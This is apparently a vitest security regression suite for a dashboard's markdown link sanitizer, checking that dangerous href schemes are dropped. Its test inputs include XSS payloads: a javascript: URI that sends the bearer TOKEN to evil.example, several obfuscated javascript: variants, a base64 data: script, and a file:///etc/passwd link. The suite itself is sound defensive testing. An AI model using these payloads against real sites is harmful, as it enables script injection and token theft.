import { describe, expect, it } from "vitest";
import { dashboardHtml } from "./ui.html";

/**
 * Security regression tests for the dashboard's markdown link renderer.
 *
 * `span.input` / `span.output` (captured under `captureContent`) carry
 * attacker-influenced text (prompt-injected model output, tool results
 * echoing fetched web content). The renderer turns `[text](url)` into a
 * real `<a href>`, and the page's CSP (`script-src 'unsafe-inline'`) does
 * NOT block `javascript:` URI execution — so the href scheme allowlist in
 * `sanitizeHref` is the only thing standing between a stored trace and
 * script running in the dashboard's origin (where the bearer TOKEN lives).
 *
 * Unlike `ui.html.spec.ts` (wiring markers only), these tests execute the
 * actual inlined client JS: the `esc` + `sanitizeHref` + `md*` function
 * sources are sliced out of the generated page and evaluated, so the code
 * under test is byte-for-byte what ships to the browser.
 */

const NUL = String.fromCharCode(0);
const SPACE = String.fromCharCode(32);
const DEL = String.fromCharCode(127);
/** The control chars / whitespace browsers ignore when parsing a URL scheme. */
const IGNORED_URL_CHARS = new RegExp(`[${NUL}-${SPACE}${DEL}]+`, "g");

type MdRuntime = {
  mdToHtml: (raw: string) => string;
  sanitizeHref: (url: string) => string | null;
};

function extractMdRuntime(): MdRuntime {
  const html = dashboardHtml("/", "Panoptic");
  const script = html.slice(html.lastIndexOf("<script>"));
  const escSrc = script.slice(script.indexOf("var esc ="), script.indexOf("var num ="));
  const mdSrc = script.slice(
    script.indexOf("function sanitizeHref"),
    script.indexOf("function renderKv"),
  );

  expect(escSrc).toContain("var esc =");
  expect(mdSrc).toContain("function mdToHtml");

  const factory = new Function(
    "var BT = String.fromCharCode(96);\n" +
      escSrc +
      "\n" +
      mdSrc +
      "\nreturn { mdToHtml: mdToHtml, sanitizeHref: sanitizeHref };",
  );

  return factory() as MdRuntime;
}

/**
 * The scheme a browser would actually act on for every href in `html`:
 * decode HTML entities once (what the HTML parser does to the attribute
 * value), strip the control chars / whitespace URL parsers ignore, and
 * lowercase. Returns the list so tests can assert none is executable.
 */
function effectiveHrefSchemes(html: string): string[] {
  const schemes: string[] = [];
  const hrefRe = /href="([^"]*)"/g;
  let match: RegExpExecArray | null;

  while ((match = hrefRe.exec(html)) !== null) {
    const decoded = match[1].replace(/&(amp|lt|gt|quot|#39);/g, (_, name: string) => {
      const map: Record<string, string> = { amp: "&", lt: "<", gt: ">", quot: '"', "#39": "'" };
      return map[name];
    });
    const url = decoded.replace(IGNORED_URL_CHARS, "").toLowerCase();
    const scheme = /^([a-z][a-z0-9+.-]*):/.exec(url);
    schemes.push(scheme ? `${scheme[1]}:` : "(none)");
  }

  return schemes;
}

const EXECUTABLE_SCHEMES = ["javascript:", "data:", "vbscript:"];

function expectNeutralized(html: string): void {
  for (const scheme of effectiveHrefSchemes(html)) {
    expect(EXECUTABLE_SCHEMES).not.toContain(scheme);
  }
}

describe("dashboard markdown link scheme allowlist", () => {
  const { mdToHtml, sanitizeHref } = extractMdRuntime();

  it("drops a javascript: link entirely — label survives as plain text, no <a>", () => {
    const html = mdToHtml("[x](javascript:alert(1))");

    expect(html).not.toContain("<a");
    expect(html).not.toContain("javascript:");
    expect(html).toContain("x");
  });

  it("neutralizes the audit's exfiltration payload (quotes ride through as entities)", () => {
    const html = mdToHtml(
      "[click me](javascript:location='https://evil.example/?d='+encodeURIComponent(TOKEN))",
    );

    expect(html).not.toContain("<a");
    expectNeutralized(html);
  });

  it("neutralizes case obfuscation (JaVaScRiPt:)", () => {
    const html = mdToHtml("[x](JaVaScRiPt:alert(1))");

    expect(html).not.toContain("<a");
    expectNeutralized(html);
  });

  it("neutralizes whitespace/control-char obfuscation inside the scheme", () => {
    const urls = [
      "java\tscript:alert(1)",
      "java\rscript:alert(1)",
      " javascript:alert(1)",
      `${NUL}javascript:alert(1)`,
    ];

    for (const url of urls) {
      const html = mdToHtml(`[x](${url})`);

      expect(html).not.toContain("<a");
      expectNeutralized(html);
    }
  });

  it("never yields an executable effective scheme for an entity-hidden payload", () => {
    // Raw text `java&#09;script:` — esc() escapes the `&`, the browser
    // decodes the attribute once, and the resulting URL string still
    // contains a literal `&`, which is an invalid scheme character: the
    // browser resolves it as a relative path, never as javascript:.
    for (const raw of ["[x](java&#09;script:alert(1))", "[x](&#106;avascript:alert(1))"]) {
      expectNeutralized(mdToHtml(raw));
    }
  });

  it("drops data: and vbscript: links", () => {
    const urls = [
      "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
      "vbscript:msgbox(1)",
    ];

    for (const url of urls) {
      const html = mdToHtml(`[x](${url})`);

      expect(html).not.toContain("<a");
      expectNeutralized(html);
    }
  });

  it("drops scheme-relative links (//host and \\\\host inherit http(s) toward a foreign host)", () => {
    for (const url of ["//evil.example/x", "\\\\evil.example\\x"]) {
      expect(mdToHtml(`[x](${url})`)).not.toContain("<a");
    }
  });

  it("still renders http, https, mailto, relative, and anchor links", () => {
    expect(mdToHtml("[docs](https://example.com/docs)")).toContain(
      '<a href="https://example.com/docs" target="_blank" rel="noopener">docs</a>',
    );
    expect(mdToHtml("[plain](http://example.com)")).toContain('href="http://example.com"');
    expect(mdToHtml("[mail](mailto:ops@example.com)")).toContain('href="mailto:ops@example.com"');
    expect(mdToHtml("[api](/api/traces)")).toContain('href="/api/traces"');
    expect(mdToHtml("[span](#trace=abc)")).toContain('href="#trace=abc"');
  });

  it("keeps sanitizing links inside headings and list items", () => {
    const html = mdToHtml(
      "# [h](javascript:alert(1))\n- [li](javascript:alert(2))\n- [ok](https://example.com)",
    );

    expect(html).not.toContain("javascript:");
    expect(html).toContain('href="https://example.com"');
  });

  it("sanitizeHref rejects other executable/opaque schemes and accepts safe ones directly", () => {
    const rejected = [
      "blob:https://x/y",
      "file:///etc/passwd",
      "chrome://settings",
      "jAvAsCrIpT\t:alert(1)",
    ];
    for (const url of rejected) {
      expect(sanitizeHref(url)).toBeNull();
    }

    for (const url of ["HTTPS://EXAMPLE.COM", "relative/path", "#anchor", "mailto:a@b.c"]) {
      expect(sanitizeHref(url)).toBe(url);
    }
  });
});
